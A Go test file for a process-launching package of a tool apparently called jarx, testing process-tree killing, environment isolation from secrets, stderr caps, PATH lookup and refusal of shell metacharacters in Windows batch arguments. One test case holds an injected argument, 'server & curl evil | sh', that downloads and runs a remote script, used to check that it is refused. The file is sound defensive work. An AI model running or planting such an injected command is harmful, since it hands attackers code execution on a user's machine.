package proc

import (
	"bufio"
	"context"
	"errors"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/nickelsec/jarx/internal/fsys"
	"github.com/nickelsec/jarx/internal/platform"
)

// The test binary doubles as the server it starts: run with "proc-helper"
// as its first argument, it does what the next argument says instead of
// running tests.
const helperArg = "proc-helper"

func TestMain(m *testing.M) {
	if len(os.Args) > 2 && os.Args[1] == helperArg {
		helper(os.Args[2], os.Args[3:])
		return
	}
	os.Exit(m.Run())
}

// helper is the child side. It runs in its own process, so its stdout and
// stderr are the pipes the test reads.
func helper(mode string, args []string) {
	out := os.Stdout //nolint:forbidigo // the helper is the child; its stdout is the pipe the test reads
	switch mode {
	case "tree":
		// Start a grandchild, say its pid, then wait to be killed.
		self, _ := os.Executable()
		gc := exec.CommandContext(context.Background(), self, helperArg, "sleep") //nolint:gosec // G204: the test binary itself
		if err := gc.Start(); err != nil {
			os.Exit(2)
		}
		_, _ = io.WriteString(out, strconv.Itoa(gc.Process.Pid)+"\n")
		time.Sleep(time.Hour)
	case "sleep":
		time.Sleep(time.Hour)
	case "env":
		for _, kv := range os.Environ() { //nolint:forbidigo // the child prints the env it got
			_, _ = io.WriteString(out, kv+"\n")
		}
	case "stderr":
		// One byte short of n, then more after a pause, so the cap has to
		// cut a write in the middle instead of landing on a chunk edge.
		n, _ := strconv.Atoi(args[0])
		_, _ = os.Stderr.WriteString(strings.Repeat("e", n-1)) //nolint:forbidigo // the child's stderr is what the test checks
		time.Sleep(200 * time.Millisecond)
		_, _ = os.Stderr.WriteString(strings.Repeat("f", 1000)) //nolint:forbidigo // as above
	case "echo":
		_, _ = io.Copy(out, os.Stdin)
	case "exit":
		os.Exit(3)
	}
	os.Exit(0)
}

// spec starts the test binary in helper mode.
func spec(t *testing.T, mode string, args ...string) Spec {
	t.Helper()
	self, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	return Spec{Path: self, Args: append([]string{helperArg, mode}, args...), Dir: t.TempDir()}
}

func start(t *testing.T, s Spec) *Process {
	t.Helper()
	p, err := Start(s)
	if err != nil {
		t.Fatalf("Start: %v", err)
	}
	t.Cleanup(func() { _ = p.Kill() })
	return p
}

func TestKillTakesTheWholeTree(t *testing.T) {
	p := start(t, spec(t, "tree"))
	line, err := bufio.NewReader(p.Stdout).ReadString('\n')
	if err != nil {
		t.Fatalf("no grandchild pid: %v (stderr %q)", err, p.Stderr())
	}
	grandchild, err := strconv.Atoi(strings.TrimSpace(line))
	if err != nil || !alive(grandchild) {
		t.Fatalf("grandchild %q isn't running", line)
	}

	if err := p.Kill(); err != nil {
		t.Fatalf("Kill: %v", err)
	}

	deadline := time.Now().Add(5 * time.Second)
	for alive(grandchild) {
		if time.Now().After(deadline) {
			t.Fatalf("grandchild %d is still running after Kill", grandchild)
		}
		time.Sleep(20 * time.Millisecond)
	}
	select {
	case <-p.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("Done never closed after Kill")
	}
}

func TestPipesConnectToTheServer(t *testing.T) {
	p := start(t, spec(t, "echo"))

	if _, err := io.WriteString(p.Stdin, "ping\n"); err != nil {
		t.Fatal(err)
	}
	line, err := bufio.NewReader(p.Stdout).ReadString('\n')
	if err != nil || line != "ping\n" {
		t.Errorf("read %q, %v; want the echo", line, err)
	}
}

func TestAnExitIsSeen(t *testing.T) {
	p := start(t, spec(t, "exit"))

	select {
	case <-p.Done():
	case <-time.After(10 * time.Second):
		t.Fatal("Done never closed")
	}
	if code := p.ExitCode(); code != 3 {
		t.Errorf("exit code = %d, want 3", code)
	}
}

func TestKillTwiceIsFine(t *testing.T) {
	p := start(t, spec(t, "sleep"))

	if err := p.Kill(); err != nil {
		t.Fatal(err)
	}
	if err := p.Kill(); err != nil {
		t.Errorf("second Kill = %v, want nil", err)
	}
}

func TestStderrIsKeptUpToTheCap(t *testing.T) {
	p := start(t, spec(t, "stderr", strconv.Itoa(StderrCap)))

	select {
	case <-p.Done():
	case <-time.After(10 * time.Second):
		t.Fatal("the helper never finished writing")
	}
	if n := len(p.Stderr()); n != StderrCap {
		t.Errorf("stderr kept %d bytes, want exactly %d", n, StderrCap)
	}
}

func TestTheServerGetsOnlyTheEnvItIsGiven(t *testing.T) {
	s := spec(t, "env")
	s.Env = []string{"MCP_TOKEN=from-config"}
	p := start(t, s)

	out, _ := io.ReadAll(p.Stdout)
	<-p.Done()

	got := strings.Split(strings.TrimSpace(string(out)), "\n")
	if !slices.Contains(got, "MCP_TOKEN=from-config") {
		t.Errorf("env = %q, want MCP_TOKEN", got)
	}
	for _, kv := range got {
		name, _, _ := strings.Cut(kv, "=")
		// Windows adds SYSTEMROOT, which programs need to start.
		if name != "MCP_TOKEN" && !strings.EqualFold(name, "SYSTEMROOT") {
			t.Errorf("the server got %s, which nobody gave it", name)
		}
	}
}

// fakeEnv is a fake home whose .jarx-env holds vars.
func fakeEnv(t *testing.T, vars string) platform.Env {
	t.Helper()
	home := t.TempDir()
	if err := os.WriteFile(filepath.Join(home, ".jarx-env"), []byte(vars), 0o600); err != nil {
		t.Fatal(err)
	}
	env, err := platform.FromHome(home)
	if err != nil {
		t.Fatal(err)
	}
	return env
}

func TestEnvIsTheBaselinePlusWhatTheConfigDeclares(t *testing.T) {
	env := fakeEnv(t, "PATH=/bin\nHOME=/home/dev\nTEMP=/tmp\nAWS_SECRET_ACCESS_KEY=jarx-should-not-pass-this\nGITHUB_TOKEN=nor-this\n")

	got := Env(env, [][2]string{{"API_KEY", "declared"}, {"HOME", "/somewhere/else"}})

	// Only the baseline vars the env has, in baseline order, then the
	// declared ones. No secret from the env, and no empty baseline var.
	if want := []string{"PATH=/bin", "TEMP=/tmp", "API_KEY=declared", "HOME=/somewhere/else"}; !slices.Equal(got, want) {
		t.Errorf("Env() = %q, want %q", got, want)
	}
}

func TestEnvNamesMatchWithoutCaseOnWindows(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("env names are case-sensitive here")
	}
	env := fakeEnv(t, "Path=C:\\bin\n")

	got := Env(env, [][2]string{{"path", "C:\\tools"}})

	n := 0
	for _, kv := range got {
		if name, _, _ := strings.Cut(kv, "="); strings.EqualFold(name, "path") {
			n++
		}
	}
	if n != 1 || !slices.Contains(got, "path=C:\\tools") {
		t.Errorf("Env() = %q, want one PATH, the declared one", got)
	}
}

func TestBatchFilesRefuseShellCharacters(t *testing.T) {
	for _, tc := range []struct {
		path string
		args []string
		bad  bool
	}{
		{`C:\nodejs\npx.cmd`, []string{"-y", "server@1.2.3"}, false},
		{`C:\nodejs\npx.cmd`, []string{"-y", "server & curl evil | sh"}, true},
		{`C:\tools\run.BAT`, []string{`"quoted"`}, true},
		{`C:\tools\run.bat`, []string{"100%"}, true},
		{`C:\tools\run.bat`, []string{"line\nbreak"}, true},
		{`C:\tools\server.exe`, []string{"a & b"}, false},
		{"/usr/bin/npx", []string{"a & b"}, false},
	} {
		err := checkBatchArgs(tc.path, tc.args)
		if (err != nil) != tc.bad || (tc.bad && !errors.Is(err, ErrBatchArgs)) {
			t.Errorf("checkBatchArgs(%s, %q) = %v, want refused %v", tc.path, tc.args, err, tc.bad)
		}
	}
}

func TestStartChecksBatchArgsBeforeRunningAnything(t *testing.T) {
	_, err := Start(Spec{Path: filepath.Join(t.TempDir(), "npx.cmd"), Args: []string{"x&y"}})

	if !errors.Is(err, ErrBatchArgs) {
		t.Errorf("Start = %v, want ErrBatchArgs", err)
	}
}

// findHome is a fake home that isn't --home: Find refuses those.
func findFS(t *testing.T, files map[string]os.FileMode) (*fsys.FS, string) {
	t.Helper()
	root := t.TempDir()
	for rel, mode := range files {
		p := filepath.Join(root, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("x"), mode); err != nil {
			t.Fatal(err)
		}
	}
	env, err := platform.Real()
	if err != nil {
		t.Fatal(err)
	}
	f, err := fsys.New(env)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = f.Close() })
	return f, root
}

func TestFindLooksOnThePath(t *testing.T) {
	f, root := findFS(t, map[string]os.FileMode{"a/tool.cmd": 0o755, "b/tool": 0o755, "b/noexec": 0o644, "c/server": 0o755})
	a, b, c := filepath.Join(root, "a"), filepath.Join(root, "b"), filepath.Join(root, "c")
	for _, tc := range []struct {
		goos, name string
		path       []string
		want       string
	}{
		{"windows", "tool", []string{a, b}, filepath.Join(a, "tool.cmd")},
		{"windows", "tool.cmd", []string{b, a}, filepath.Join(a, "tool.cmd")},
		{"linux", "tool", []string{a, b}, filepath.Join(b, "tool")},
		{"linux", "noexec", []string{b}, ""},
		{"linux", filepath.Join(c, "server"), nil, filepath.Join(c, "server")},
		{"linux", "missing", []string{a, b, c}, ""},
	} {
		if runtime.GOOS == "windows" && tc.goos != "windows" {
			continue // files on Windows have no exec bit, so unix lookups can't be checked here
		}
		got, err := find(f, tc.goos, tc.path, ".COM;.EXE;.BAT;.CMD", tc.name)
		if got != tc.want || (tc.want == "" && err == nil) {
			t.Errorf("find(%s, %s) = %q, %v; want %q", tc.goos, tc.name, got, err, tc.want)
		}
	}
}

func TestFindNeverRunsFromAFakeHome(t *testing.T) {
	env := fakeEnv(t, "PATH=/bin\n")
	f, err := fsys.New(env)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = f.Close() })

	if _, err := Find(f, env, "node"); !errors.Is(err, ErrFakeHome) {
		t.Errorf("Find = %v, want ErrFakeHome", err)
	}
}

func TestNoEnvMeansAnEmptyEnvNotJarxsOwn(t *testing.T) {
	p := start(t, spec(t, "env")) // Spec.Env left nil

	out, _ := io.ReadAll(p.Stdout)
	<-p.Done()

	for kv := range strings.SplitSeq(strings.TrimSpace(string(out)), "\n") {
		if name, _, _ := strings.Cut(kv, "="); name != "" && !strings.EqualFold(name, "SYSTEMROOT") {
			t.Errorf("the server got %s from jarx's own env", name)
		}
	}
}
